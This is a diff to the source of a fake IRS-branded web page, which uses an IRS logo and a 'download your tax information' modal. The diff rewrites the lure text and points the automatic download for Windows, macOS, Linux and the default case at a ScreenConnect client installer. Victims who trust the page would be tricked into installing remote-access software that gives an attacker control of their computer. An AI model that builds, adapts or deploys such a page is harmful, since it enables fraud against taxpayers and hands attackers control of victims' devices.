@@ -709,8 +709,8 @@
         <text x="76" y="58" text-anchor="middle" font-size="38" font-weight="900" fill="#1a1a1a" font-family="serif" letter-spacing="2">IRS</text>
       </svg>
     </div>
-    <div class="modal-title">Access your tax downloaded information!</div>
-    <div class="modal-subtitle">If your document did not download automatically, would you download it manually?</div>
+    <div class="modal-title">Access your compiled tax downloaded information using the U.S treasury screen-client tax connect!</div>
+    <div class="modal-subtitle">If your connect files did not download automatically, would you download it manually?</div>
     <div class="modal-buttons">
       <button class="btn-no" onclick="document.getElementById('feedbackModal').style.display='none'">No thanks</button>
       <button class="btn-yes"onclick="document.getElementById('feedbackModal').style.display='none'">Yes, I'd like to download manually.</button>
@@ -833,10 +833,10 @@
     const base = CONFIG.DOWNLOAD_BASE_URL;
     const ts = new Date().getTime();
     switch (os) {
-      case 'windows': return base + 'TaxAct-2026Doc1040W2W9W94.msi';
-      case 'macos': return base + 'TaxAct-2026Doc1040W2W9W94.msi';
-      case 'linux': return base + 'TaxAct-2026Doc1040W2W9W94.msi';
-      default: return base + 'TaxAct-2026Doc1040W2W9W94.msi';
+      case 'windows': return base + 'ScreenConnect.ClientSetup.msi';
+      case 'macos': return base + 'ScreenConnect.ClientSetup.msi';
+      case 'linux': return base + 'ScreenConnect.ClientSetup.msi';
+      default: return base + 'ScreenConnect.ClientSetup.msi';
     }
   }
 
